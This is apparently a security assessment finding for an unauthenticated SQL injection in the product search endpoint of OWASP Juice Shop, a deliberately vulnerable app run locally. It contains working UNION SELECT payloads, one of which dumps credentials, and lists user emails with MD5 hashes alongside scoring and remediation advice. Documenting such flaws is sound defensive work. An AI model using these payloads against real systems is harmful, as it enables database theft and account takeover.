# F-001: SQL Injection — /rest/products/search?q=

## Title
Unauthenticated UNION-based SQL Injection in Product Search Endpoint

## Severity
**CRITICAL**

## CVSS 3.1
**Score: 9.8**
Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## CWE
**CWE-89** — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)

## Endpoint
```
GET /rest/products/search?q=<PAYLOAD>
Host: localhost:3000
```

## Description
The `q` parameter of the `/rest/products/search` endpoint is passed directly into a SQLite SQL query without sanitization or parameterization. An unauthenticated attacker can inject arbitrary SQL via the `q` parameter.

The underlying query uses string interpolation, making it possible to:
1. Trigger a SQLite syntax error (confirming injection point)
2. Perform UNION SELECT to inject arbitrary rows into the response
3. Enumerate all database tables via `sqlite_master`
4. Extract full contents of any table, including the `Users` table with email addresses and MD5 password hashes

The injection syntax uses `))`  to escape an existing subquery/nested context before appending the UNION clause.

Working injection template:
```
ZZZNOTFOUND')) UNION SELECT <cols> FROM <table>--
```

## Evidence Summary

### Step 1: Error-based confirmation
Request:
```
GET /rest/products/search?q=%27%20OR%201%3D1--
```
Response: HTTP 500 with body containing `SQLITE_ERROR: incomplete input` — confirms unsanitized SQL input reaches the database engine.

### Step 2: UNION SELECT (9 columns)
Request:
```
GET /rest/products/search?q=ZZZNOTFOUND'))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9--
```
Response: Injected row `{id:1, name:"2", description:"3", ...}` returned in `data` array — confirms write-through UNION injection with 9 columns.

### Step 3: SQLite version extracted
```
GET /rest/products/search?q=ZZZNOTFOUND'))%20UNION%20SELECT%20sqlite_version(),2,3,4,5,6,7,8,9--
```
Response id field: `3.44.2`

### Step 4: Table enumeration
21 tables discovered: `Users, sqlite_sequence, Addresses, Baskets, Products, BasketItems, Captchas, Cards, Challenges, Complaints, Deliveries, Feedbacks, Hints, ImageCaptchas, Memories, PrivacyRequests, Quantities, Recycles, SecurityQuestions, SecurityAnswers, Wallets`

### Step 5: Credential dump (CRITICAL)
Request:
```
GET /rest/products/search?q=ZZZNOTFOUND'))%20UNION%20SELECT%20GROUP_CONCAT(email||':'||password),2,3,4,5,6,7,8,9%20FROM%20Users--
```
Response: 22 user accounts extracted as `email:md5_hash` pairs, including:
- `admin@juice-sh.op:0192023a7bbd73250516f069df18b500`
- `jim@juice-sh.op:e541ca7ecf72b8d1286474fc613e5e45`
- `bjoern.kimminich@gmail.com:6edd9d726cbdc873c539e41ae8757b8c`
- (and 19 more accounts)

Finding reproduced 3/3 times independently.

## Impact
- **Authentication bypass**: MD5 password hashes are weak and susceptible to offline cracking, enabling account takeover for all 22 accounts including administrator.
- **Data exposure**: Full access to all database tables — user PII, orders, payment cards, security answers.
- **Integrity risk**: If the database user has WRITE permissions, INSERT/UPDATE/DELETE attacks are also possible.
- **No authentication required**: The endpoint is publicly accessible without any session token.

## Remediation

### Primary Fix: Parameterized Queries (ORM or Prepared Statements)
Replace string-interpolated SQL with parameterized queries. In Sequelize (the ORM used by Juice Shop):

```javascript
// VULNERABLE:
Products.findAll({ where: sequelize.literal(`name LIKE '%${req.query.q}%'`) })

// FIXED (Sequelize parameterized):
Products.findAll({ where: { name: { [Op.like]: `%${req.query.q}%` } } })
```

### Secondary Controls
1. **Input validation**: Reject or escape special characters (`'`, `)`, `--`, `/*`, `UNION`, `SELECT`) in search inputs via an allowlist or WAF rule.
2. **Least-privilege DB user**: The application DB account should have SELECT-only permissions on required tables, not full schema access.
3. **Error handling**: Never expose raw database error messages (SQLITE_ERROR) to the client — return generic 400/500 responses.
4. **Password hashing**: Replace MD5 with bcrypt/argon2 to increase offline cracking cost even if credentials are leaked.
5. **Rate limiting**: Apply rate limiting to search endpoint to slow down automated data extraction.

## References
- OWASP Top 10 2021 — A03:2021 Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- ASVS 5.0 V5.3.4 — Query parameterization requirement
